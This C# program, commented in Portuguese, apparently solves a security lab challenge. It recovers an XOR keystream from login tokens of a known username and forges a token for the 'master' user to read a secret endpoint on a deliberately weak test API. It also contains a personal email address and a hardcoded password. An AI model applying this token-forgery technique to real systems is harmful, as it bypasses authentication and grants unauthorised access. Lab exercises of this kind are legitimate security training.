using System;
using System.Net.Http;
using System.Collections.Generic;
using System.Text.Json;
using System.Text;
using System.Net.Http.Headers;
using System.Linq;

namespace ConsoleAppLacuna
{
    class Program
    {
        private static readonly HttpClient client = new HttpClient();
        public static byte[] key_byte = new byte[32];
        public static byte[] token_byte = new byte[86];
        static void Main(string[] args)
        {
            Console.WriteLine("Hello World!");

            Registra();
            PostLogin(); // Função que realiza um post para obter um token válido
            System.Threading.Thread.Sleep(1000);
            DescobrePad(); //Função que descobre o caractere de padding
            System.Threading.Thread.Sleep(1000);
            AcessaMaster(); //Função que acessa o caminho do master
            System.Threading.Thread.Sleep(20000);

            
           
            
        }

        static async void PostLogin()
        {
            var values = new Dictionary<string, string>
            {
            { "username", "igorlousadaaaaaaaaaaaaaaaaaaaaaa" },
            { "password", "Lousada123" },
            }; // cria dicionário 
            var json = JsonSerializer.Serialize(values);  //cria json
            var content = new StringContent(json, Encoding.UTF8, "application/json"); //codificação de json
            client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", "Your Oauth token"); //valor de token
            var response = await client.PostAsync("https://weak-system-lab.lacunasoftware.com/api/users/login", content); //requisição post
            var responseString = await response.Content.ReadAsStringAsync(); //espera a resposta
           

            var token = JsonSerializer.Deserialize<Dictionary<string, string>>(responseString); //deserializa o json do token de resposta
            Console.WriteLine(token["token"]);

            token_byte = StringToByteArray(token["token"]); //transforma string em vetor de bytes

            foreach (byte value in token_byte)
            {
                Console.Write($"{value} ");


            }

            

           
            byte[] username_byte = Encoding.ASCII.GetBytes(values["username"]);

            for (var y=0; y<32; y++)
            {

                key_byte[y] = (byte)(username_byte[y]^token_byte[y+6]);    // Loop que realiza o xor para descobrir o valor da chave na posição onde é inserido o usuário no token byte

                Console.WriteLine(key_byte[y]);
            }

            Console.WriteLine("");
            Console.WriteLine("Tamanho do token_byte ");
            Console.WriteLine(token_byte.Length);
            




        }

        static async void Registra()
        {
            var values = new Dictionary<string, string>
            {
            { "username", "igorlousada" },
            { "password", "Lousada123" },
            {"email", "igorcoutinho97@gmail.com" }                                                              
            };
            var json = JsonSerializer.Serialize(values);
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", "Your Oauth token");
            var response = await client.PostAsync("https://weak-system-lab.lacunasoftware.com/api/users/create", content);
            var responseString = await response.Content.ReadAsStringAsync();
            Console.WriteLine("Print ResponseString");
            Console.WriteLine(responseString);
            
            




        }
     

        public static byte[] StringToByteArray(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }


        static async void RegistraVarios()
        {

            var values = new Dictionary<string, string>
            {
            { "username", "igorlousadaa" },
            { "password", "Lousada123" },
            {"email", "igorcoutinho97@gmail.com" }
            };

            int dec = 48;

            for (var i = 0; i < 10; i++)
            {
                values["username"] = values["username"].Remove(values["username"].Length - 1);
                char car = Convert.ToChar(dec + i);
                Console.WriteLine(values["username"]);
                values["username"] = values["username"] + car;
                Console.WriteLine(values["username"]);
                var json = JsonSerializer.Serialize(values);
                var content = new StringContent(json, Encoding.UTF8, "application/json");
                client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", "Your Oauth token");
                var response = await client.PostAsync("https://weak-system-lab.lacunasoftware.com/api/users/create", content);
                var responseString = await response.Content.ReadAsStringAsync();
                Console.WriteLine("Print ResponseString");
                Console.WriteLine(responseString);

                

            }
        }



        static async void PostVarios()
        {
            var values = new Dictionary<string, string>
            {
            { "username", "igorlousada" },
            { "password", "Lousada123" },
            };

            int dec = 48;

            for (var i=0; i<10;i++)
            {

                values["username"] = values["username"].Remove(values["username"].Length - 1);
                char car = Convert.ToChar(dec + i);
                Console.WriteLine(values["username"]);
                values["username"] = values["username"] + car;
                Console.WriteLine(values["username"]);
                var json = JsonSerializer.Serialize(values);
                var content = new StringContent(json, Encoding.UTF8, "application/json");
                client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", "Your Oauth token");
                var response = await client.PostAsync("https://weak-system-lab.lacunasoftware.com/api/users/login", content);
                var responseString = await response.Content.ReadAsStringAsync();
                

                var token = JsonSerializer.Deserialize<Dictionary<string, string>>(responseString);
                Console.WriteLine(token["token"]);

                token_byte = StringToByteArray(token["token"]);

                Console.WriteLine(token_byte[17].ToString());
                Console.WriteLine("");
                Console.WriteLine("Tamanho do token_byte ");
                Console.WriteLine(token_byte.Length);
               
                System.Threading.Thread.Sleep(500);
            }


        }


        static public async void DescobrePad()
        {



            var values = new Dictionary<string, string>
            {
            { "username", "igorlousada" },
            { "password", "Lousada123" },
            };
            var json = JsonSerializer.Serialize(values);
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", "Your Oauth token");
            var response = await client.PostAsync("https://weak-system-lab.lacunasoftware.com/api/users/login", content);
            var responseString = await response.Content.ReadAsStringAsync();
            

            var token = JsonSerializer.Deserialize<Dictionary<string, string>>(responseString);
            Console.WriteLine(token["token"]);

            token_byte = StringToByteArray(token["token"]);

            foreach (byte value in token_byte)
            {
                Console.Write($"{value} ");


            }

           

            
            byte[] username_byte = new byte[32];

            for (var y = 0; y < 32; y++)
            {

                username_byte[y] = (byte)(key_byte[y] ^ token_byte[y + 6]);          //Este loop utiliza o valor da chave descoberta em PostLogin e o valor do token para descobrir o caractere de padding

                Console.WriteLine(username_byte[y]);                                //Como o usuário master tem 6 letras e não sabemos o caractere de padding, esta operação é necessário, seguindo a descrição do problema
            }

            string username_string = Encoding.ASCII.GetString(username_byte);
            Console.WriteLine("");
            Console.WriteLine("username_string ");
            Console.WriteLine(username_string);
          



        }



        static public async void AcessaMaster()
        {

            string token_master;

            string master = "master#########################";
            Console.WriteLine(master);
            byte[] master_byte = Encoding.ASCII.GetBytes(master); 

            for (var y=0 ;y < 15; y++){

                token_byte[y + 6] = (byte)(master_byte[y] ^ key_byte[y]);      //cria o token falso
                       




            }

            token_master = ByteArrayToString(token_byte);



            client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", token_master);
            var response = await client.GetAsync("https://weak-system-lab.lacunasoftware.com/api/secret");
            var responseString = await response.Content.ReadAsStringAsync();
            Console.WriteLine("Get Response");
            Console.WriteLine(responseString);
           



        }

        public static string ByteArrayToString(byte[] ba)
        {
            StringBuilder hex = new StringBuilder(ba.Length * 2);
            foreach (byte b in ba)
                hex.AppendFormat("{0:x2}", b);
            return hex.ToString();
        }
    }
}
